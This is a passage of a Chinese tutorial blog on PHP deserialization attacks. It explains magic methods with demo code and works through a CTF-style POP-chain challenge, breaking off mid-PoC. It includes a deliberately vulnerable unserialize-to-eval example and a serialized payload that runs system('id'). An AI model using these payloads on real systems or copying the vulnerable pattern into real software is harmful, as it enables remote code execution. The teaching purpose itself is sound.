<h2 id="析构函数例题"><a href="#析构函数例题" class="headerlink" title="析构函数例题"></a>析构函数例题</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo &#x27;dazhuang666!!&#x27;;&quot;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">unserialize()触发destruct()函数，destruct()函数执行eval()函数，eval()触发代码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">payload:</span></span><br><span class="line"><span class="comment">O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-weakup和sleep魔术方法"><a href="#0x04-weakup和sleep魔术方法" class="headerlink" title="0x04 weakup和sleep魔术方法"></a>0x04 weakup和sleep魔术方法</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="_sleep()"></a>_sleep()</h2><ul>
<li>序列化serialize()函数会检查类中是否存在魔术方法_sleep()，如果存在会先调用该方法，然后在执行序列化。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">序列化前先触发了魔术方法_sleep()，_sleep()执行返回需要序列化的变量名，并且只序列化_sleep()返回的变量。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="_wakeup()"></a>_wakeup()</h2><ul>
<li><code>unserialize()</code>函数会检查是否存在魔术方法<code>_wakeup()</code>。如果存在，则会先调用<code>_wakeup()</code>方法，预先准备对象需要的资源。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">object(User)#1 (4) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;username&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">  [&quot;nickname&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) &quot;b&quot;</span></span><br><span class="line"><span class="comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span></span><br><span class="line"><span class="comment">  NULL</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">反序列化前先触发了魔术方法_wakeup()给password赋值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-toString和invoke魔术方法"><a href="#0x05-toString和invoke魔术方法" class="headerlink" title="0x05 toString和invoke魔术方法"></a>0x05 toString和invoke魔术方法</h1><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="_toString()"></a>_toString()</h2><ul>
<li>把对象当成字符串调用会导致魔术方法<code>_toString()</code>触发。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;格式不对，输出不了!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">User Object</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [benben] =&gt; this is test!!</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">object(User)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;benben&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(14) &quot;this is test!!&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">格式不对，输出不了!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">把类User实体化并赋值给$test，此时$test是个对象，调用对象可以使用print_r或者var_dump，而echo或者print将对象当成字符串调用,此时会自动触发_toString()。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="invoke"><a href="#invoke" class="headerlink" title="_invoke()"></a>_invoke()</h2><ul>
<li>把对象当成函数调用会导致魔术方法<code>_invoke()</code>触发。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;它不是个函数!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">this is test!!</span></span><br><span class="line"><span class="comment">它不是个函数!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">把类User实体化并赋值给$test，此时$test是个对象，当加上()后是把对象$test当成函数$test()调用，导致触发__invoke()。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x06-错误调用魔术方法"><a href="#0x06-错误调用魔术方法" class="headerlink" title="0x06 错误调用魔术方法"></a>0x06 错误调用魔术方法</h1><h2 id="call"><a href="#call" class="headerlink" title="_call()"></a>_call()</h2><ul>
<li>调用一个不存在的方法即可触发魔术方法<code>_call()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">callxxx,a</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析：</span></span><br><span class="line"><span class="comment">调用方法callxxx()不存在，触发魔术方法_call()，传参$arg1，$arg2(callxxx,a)，返回调用的不存在的方法的名称和参数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$arg1:调用的不存在的方法的名称；</span></span><br><span class="line"><span class="comment">$arg2:调用的不存在的方法的参数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="callStatic"><a href="#callStatic" class="headerlink" title="_callStatic()"></a>_callStatic()</h2><ul>
<li>静态调用或者调用成员常量时使用的方法不存在即可触发魔术方法<code>_callStatic()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">callxxx,a</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">静态调用::时的方法callxxx()不存在，触发魔术方法_callStatic()，传参$arg1，$arg2(callxxx,a)，返回调用的不存在的方法的名称和参数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="get"><a href="#get" class="headerlink" title="_get()"></a>_get()</h2><ul>
<li>调用的成员属性不存在即可触发魔术方法<code>_get()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">var2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">调用的成员属性var2不存在，触发魔术方法_get()，把不存在的属性名称var2赋值给$var1，返回不存在的成员属性的名称。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="set"><a href="#set" class="headerlink" title="_set()"></a>_set()</h2><ul>
<li>给不存在的成员属性赋值即可触发魔术方法<code>_set()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">var2,1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">给不存在的成员属性var2赋值，触发魔术方法_set()，返回不存在的成员属性的名称和赋的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$arg1:不存在的成员属性的名称；</span></span><br><span class="line"><span class="comment">$arg2:给不存在的成员属性var2赋的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="isset"><a href="#isset" class="headerlink" title="_isset()"></a>_isset()</h2><ul>
<li>对不可访问属性使用<code>isset()</code>或<code>empty()</code>时，即可触发魔术方法<code>_isset()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">empty</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">var</span></span><br><span class="line"><span class="comment">var</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">isset()调用的成员属性var不可访问或不存在，触发了魔术方法_isset(),返回不存在的成员属性的名称。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="unset"><a href="#unset" class="headerlink" title="_unset()"></a>_unset()</h2><ul>
<li>对不可访问或不存在的属性使用<code>unset()</code>时即可触发魔术方法<code>_unset()</code></li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">var</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">分析:</span></span><br><span class="line"><span class="comment">unset()调用的成员属性var不可访问或不存在，触发了魔术方法unset()，返回不存在的成员属性的名称。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="clone"><a href="#clone" class="headerlink" title="_clone()"></a>_clone()</h2><ul>
<li>当使用<code>clone()</code>拷贝完成一个对象时，新对象会自动调用定义的魔术方法<code>_clone()</code>。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __clone()</span><br><span class="line">    &#123;</span><br><span class="line">        echo  &quot;__clone test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$newclass = clone($test)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">输出结果:</span><br><span class="line">_clone test</span><br><span class="line"></span><br><span class="line">分析:</span><br><span class="line">使用_clone克隆对象完成后，触发魔术方法_clone()。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<h1 id="0x07-POP链构造及POC构造"><a href="#0x07-POP链构造及POC构造" class="headerlink" title="0x07 POP链构造及POC构造"></a>0x07 POP链构造及POC构造</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>目标：触发<code>echo</code>，调用<code>$flag</code></li>
<li>第一步 ：触发<code>invoke()</code>**(对象当成函数调用)**，调用<code>append($value)</code>，并使<code>$var=flag.php</code></li>
<li>第二步：触发<code>get()</code>**(调用的成员属性不存在)**，给<code>$p</code>赋值为<code>new Modifier()</code></li>
<li>第三步：触发<code>toString</code>**(把对象当成字符串调用)**，给<code>$str</code>赋值为<code>new Test()</code></li>
<li>第四步：触发<code>wakeup</code><strong>(反序列化时触发)</strong>,给<code>$source</code>赋值为<code>new Show()</code></li>
<li>poc如下：</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="comment">//    public function __construct()&#123;</span></span><br><span class="line"><span 